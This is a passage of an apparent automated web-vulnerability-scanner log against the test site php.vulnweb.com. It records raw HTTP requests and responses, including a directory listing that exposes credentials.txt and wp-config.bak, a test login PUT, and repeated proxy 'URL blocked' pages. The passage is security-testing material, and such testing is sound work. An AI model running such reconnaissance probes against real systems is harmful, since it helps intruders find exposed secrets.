<a href="6.jpg.tn">6.jpg.tn</a>                                           11-May-2011 10:27                4345
<a href="7.jpg">7.jpg</a>                                              11-May-2011 10:27               19219
<a href="7.jpg.tn">7.jpg.tn</a>                                           11-May-2011 10:27                6458
<a href="8.jpg">8.jpg</a>                                              11-May-2011 10:27               50299
<a href="8.jpg.tn">8.jpg.tn</a>                                           11-May-2011 10:27                4139
<a href="WS_FTP.LOG">WS_FTP.LOG</a>                                         23-Jan-2009 10:06                 771
<a href="credentials.txt">credentials.txt</a>                                    23-Jan-2009 10:47                  33
<a href="ipaddresses.txt">ipaddresses.txt</a>                                    23-Jan-2009 12:59                  52
<a href="path-disclosure-unix.html">path-disclosure-unix.html</a>                          08-Apr-2013 08:42                3936
<a href="path-disclosure-win.html">path-disclosure-win.html</a>                           08-Apr-2013 08:41                 698
<a href="wp-config.bak">wp-config.bak</a>                                      03-Dec-2008 14:37                1535
</pre><hr></body>
</html>
]]></RawResponse><Request id="EC54310C1F88F6659328976C3D636498"><Method>GET</Method><Path>/pictures/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/1.jpg</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="EC54310C1F88F6659328976C3D636498";PSID="5F6018E6C06400949E0FF1908A85E6E6";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="72";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="4dba7fec";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d8aa85d8";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /pictures/</title></head>
<body>
<h1>Index of /pictures/</h1><hr><pre><a href="../">../</a>
<a href="1.jpg">1.jpg</a>                                              11-May-2011 10:27               12426
<a href="1.jpg.tn">1.jpg.tn</a>                                           11-May-2011 10:27                4355
<a href="2.jpg">2.jpg</a>                                              11-May-2011 10:27                3324
<a href="2.jpg.tn">2.jpg.tn</a>                                           11-May-2011 10:27                1353
<a href="3.jpg">3.jpg</a>                                              11-May-2011 10:27                9692
<a href="3.jpg.tn">3.jpg.tn</a>                                           11-May-2011 10:27                3725
<a href="4.jpg">4.jpg</a>                                              11-May-2011 10:27               13969
<a href="4.jpg.tn">4.jpg.tn</a>                                           11-May-2011 10:27                4615
<a href="5.jpg">5.jpg</a>                                              11-May-2011 10:27               14228
<a href="5.jpg.tn">5.jpg.tn</a>                                           11-May-2011 10:27                4428
<a href="6.jpg">6.jpg</a>                                              11-May-2011 10:27               11465
<a href="6.jpg.tn">6.jpg.tn</a>                                           11-May-2011 10:27                4345
<a href="7.jpg">7.jpg</a>                                              11-May-2011 10:27               19219
<a href="7.jpg.tn">7.jpg.tn</a>                                           11-May-2011 10:27                6458
<a href="8.jpg">8.jpg</a>                                              11-May-2011 10:27               50299
<a href="8.jpg.tn">8.jpg.tn</a>                                           11-May-2011 10:27                4139
<a href="WS_FTP.LOG">WS_FTP.LOG</a>                                         23-Jan-2009 10:06                 771
<a href="credentials.txt">credentials.txt</a>                                    23-Jan-2009 10:47                  33
<a href="ipaddresses.txt">ipaddresses.txt</a>                                    23-Jan-2009 12:59                  52
<a href="path-disclosure-unix.html">path-disclosure-unix.html</a>                          08-Apr-2013 08:42                3936
<a href="path-disclosure-win.html">path-disclosure-win.html</a>                           08-Apr-2013 08:41                 698
<a href="wp-config.bak">wp-config.bak</a>                                      03-Dec-2008 14:37                1535
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:06 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>2669</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="0CE4A795078B29F1E99E959EE4467759"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="0CE4A795078B29F1E99E959EE4467759"><![CDATA[PUT /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
Cookie: CustomCookie=WebInspect0

uname=12345&pass=foo]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:07 GMT
Server: nginx/1.19.0
Location: login.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 14

you must login]]></RawResponse><Request id="0CE4A795078B29F1E99E959EE4467759"><Method>PUT</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uname=12345&amp;pass=foo</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>20</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[you must login]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:07 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>14</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="210657288A91100C4123A79F42F2ACAF"><URL>http://php.vulnweb.com:80/pictures/1.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="210657288A91100C4123A79F42F2ACAF"><![CDATA[GET /pictures/1.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="210657288A91100C4123A79F42F2ACAF";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="64edeffa";
X-Request-Memo: ID="b0f2adfb";sc="2";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/1.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="210657288A91100C4123A79F42F2ACAF"><Method>GET</Method><Path>/pictures/</Path><File>1.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="210657288A91100C4123A79F42F2ACAF";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="64edeffa";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b0f2adfb";sc="2";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/1.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="F23F638F1BEFA4A9352351623ED5929E"><URL>http://php.vulnweb.com:80/pictures/2.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="F23F638F1BEFA4A9352351623ED5929E"><![CDATA[GET /pictures/2.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="F23F638F1BEFA4A9352351623ED5929E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="f99ade72";
X-Request-Memo: ID="171c847a";sc="2";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/2.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="F23F638F1BEFA4A9352351623ED5929E"><Method>GET</Method><Path>/pictures/</Path><File>2.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="F23F638F1BEFA4A9352351623ED5929E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="f99ade72";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="171c847a";sc="2";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/2.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
